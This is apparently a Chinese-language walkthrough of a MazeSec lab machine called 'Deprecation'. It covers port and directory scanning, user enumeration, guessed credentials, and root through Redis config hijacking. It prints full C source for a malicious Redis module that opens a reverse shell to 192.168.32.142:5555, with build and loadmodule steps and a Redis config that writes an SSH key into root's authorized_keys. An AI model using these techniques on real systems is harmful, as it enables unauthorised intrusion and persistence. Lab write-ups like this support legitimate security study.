---
title: 'Deprecation'
date: 2026-03-01 20:21:22 +0800
categories:
  - 渗透练习
  - mazesec
tags:
  - Deprecation
---
## Deprecation

端口扫描

```bash
 ~/Desktop/maze  nmap -p- -sC -sV -T4 $IP                                                                     ✔  04:04:33 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-01 04:04 UTC
Nmap scan report for 192.168.32.136
Host is up (0.00079s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0 (protocol 2.0)
80/tcp open  http    nginx
|_http-title: Neon Abyss \xE2\x80\xA2 Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
MAC Address: 08:00:27:83:AC:2A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.62 seconds
```

目录扫描，发现有注册reg.php，config.php看不到

```
 ~/Desktop/maze  feroxbuster -u http://192.168.32.136/ --depth=1 -x php,html,txt,zip,bak                      ✔  04:05:15 
                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.32.136/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, zip, bak]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 1
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      146c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                     
403      GET        7l        9w      146c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                     
200      GET      210l      471w     4720c http://192.168.32.136/style.css
200      GET       31l       64w     1003c http://192.168.32.136/
200      GET        0l        0w        0c http://192.168.32.136/config.php
200      GET       31l       64w     1003c http://192.168.32.136/index.php
200      GET       38l       99w     1314c http://192.168.32.136/reg.php
200      GET        1l        2w       13c http://192.168.32.136/dashboard.php
[####################] - 12s   180018/180018  0s      found:6       errors:0      
[####################] - 12s   180000/180000  15092/s http://192.168.32.136/ 
```

但是不知道为什么注册会失败

登录界面限制登录次数，不允许爆破，倒是可以用这个功能探测用户

既然用户名存在能返回剩余次数，我就探测用户名，爆破的时候发现admin&12345和admin+也会消耗admin的登录次数

还发现了guest和test用户

太抽象了，guest都不知道试了几次试出来了，`guest:guest123`。

提示是passwd，就有一个注释 `shan******` 。猜到是ssh密码，我一开始还弄了个 shan 开头的字典用hydra爆破呢

`shanran:shanran123`

事实证明，ai的思路比我准多了

![image-20260301141354505](/assets/img/posts/deprecation/image-20260301141354505.png)



redis配置文件劫持

![image-20260301142919650](/assets/img/posts/deprecation/image-20260301142919650.png)

一开始想的是把公钥写到ssh里，但是不行，估计是有redis自己的东西把内容打乱了

```
set x "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDnZjW2LP3mg6aBb6apIdF6ZGdjOtE+DMf2WSbyBs/HtXyeHhdfWx9iI6MV/iaWXVoCuVpzf+pqvq1+JKsjkDmC0q2rEnwTmwOfXw1+b37yVUUgeBO76eXw4ImpVWUG7D7VS8LBVvGTXvGor4jRAQCrykCSVwtwsgUikdcR3/D5mX2sLIT39i3zBatFY1lDe4t2qjOCOL4v335EtrLpvJjSJ5ORJqQGy8VCFnK684e7StabUY24TeWj9E5QSiWLucw8d1NsKc4kjcOMArnu1WcFMAH2MgIYR2pXxAAyyGBOcGkQKAuBpTw2uJvsBh13GzK6j7GcLASdnFpcMMzucwts6h+ZtiMDq4iK9ebVTAgR9DhCXGNHY9o5OBZltdMfkoP4C210Y02/cmMnH5FsImVzqgTNVQvQoqNdnp56XsDhW0TEOeZEDPYnTZAr7M6y1dp5j7SAxL54T++gqgym5dgGGFZCbJcASVChWwcb8cskWA9eV+rVLTFiNxn7o5P5zjgkJoUyiGGbK99luBNyMIc+Cfi7ROHK+3aRmi0LqCVykLVwwJzib13YNGSZFlq1nc0pf4c/kEVtgm+78X1ks3k0JxSBZIDF4Dj4c2NWN+B1cgseMnc7CxA+c6emlzpQnEhm1YSqgvhC7g5OziOEC81p2tK+NtjsJ8zjR2tOgyKwJw== kali@kali"
```

。。我说我这个方案失败了，但是gpt只认可这个方案，其他的都不认可

后来deepseek提出了加载恶意模块，原来中国ai不骗中国人

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void init() __attribute__((constructor));

void init() {
    int sock;
    struct sockaddr_in server;
    char *argv[] = { "/bin/sh", NULL };
    if (fork() == 0) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        server.sin_family = AF_INET;
        server.sin_port = htons(5555);
        server.sin_addr.s_addr = inet_addr("192.168.32.142");
        connect(sock, (struct sockaddr *)&server, sizeof(server));
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        execve("/bin/sh", argv, NULL);
    }
}
```

编译并上传

```bash
gcc -shared -o exp.so -fPIC exp.c
```

修改配置文件

```
loadmodule /tmp/exp.so
```

重启redis

![image-20260301145224905](/assets/img/posts/deprecation/image-20260301145224905.png)



#### user.txt 复盘

复盘的时候才看懂这个reg.php，前面没认真看，原来是另一种方式的爆破密码

```php
$password_taken = false;
    foreach ($users as $existing_password) {
        if ($password === $existing_password) {
            $password_taken = true;
            break;
        }
    }

    if ($password_taken) {
        die(json_encode([
            'status' => 'error',
            'msg'    => '这个密码已被系统占用，无法注册，请更换密码'
        ]));
    }
```

![image-20260301150348524](/assets/img/posts/deprecation/image-20260301150348524.png)

还有ssh密码的爆破，用了一下群里的模板生成方案

![image-20260301184046273](/assets/img/posts/deprecation/image-20260301184046273.png)



#### root.txt 复盘

看完群主的视频才了解了为什么我之前写公钥失败了，这里把之前不知道的知识点都写一下

关于redis写文件

redis写文件靠的是redis的持久化机制，有两个机制，一个是 RDB 快照机制，还有一个是 AOF 追加日志
这里写文件利用的就是快照机制

当你执行 `SAVE` 或触发 RDB 时，Redis 会：

1. fork 一个子进程（后台保存）
2. 子进程把内存里的键值序列化成 **RDB 格式**
3. 输出到：`dir + "/" + dbfilename`

问题在于，这个格式的文件会带着一些自带的二进制数据，污染了我们想写的文件的内容，比如公钥前后带着一串别的东西就会失效

但是 公钥（authorized_keys） 在读取的时候非常宽松，因为它认可多个识别到的公钥串，当它遇到不认识的内容时，它会继续尝试读，直到下一个能认出来的公钥串或者失败，同样，sudoers 文件有同样的机制

所以我们只需要在写想写的内容前面和后面各加两个换行符，把写的内容和垃圾数据隔开，这就是群主提出的“小垃圾堆方案”了 

还有一个点，为什么不能在运行时 `CONFIG SET dir` ，是因为这是 Redis 新版本引入的安全限制，只允许修改 /etc/redis.conf来配置



当然，除了 authorized_keys 和 sudoers 以外，还有别的方案，这里先把写公钥的方案记录一下

修改配置文件

```
bind 127.0.0.1
port 6379
protected-mode no
tcp-backlog 511
timeout 0
tcp-keepalive 300

daemonize yes
supervised no
pidfile /run/redis/redis.pid
loglevel notice
logfile /var/log/redis/redis.log

requirepass mypassword123
rename-command FLUSHALL ""

dir /root/.ssh/   
dbfilename authorized_keys
save 900 1
save 300 10
save 60 10000
```

写入公钥

```bash
cat a | redis-cli -a mypassword123 -x set ssh
127.0.0.1:6379> keys ssh
1) "ssh"
127.0.0.1:6379> save
OK
127.0.0.1:6379> exit
sudo /sbin/rc-service redis restart
```

![image-20260301201518800](/assets/img/posts/deprecation/image-20260301201518800.png)



试了一下写到 /sbin/rc-service 但是好像会把文件头顶掉然后报错


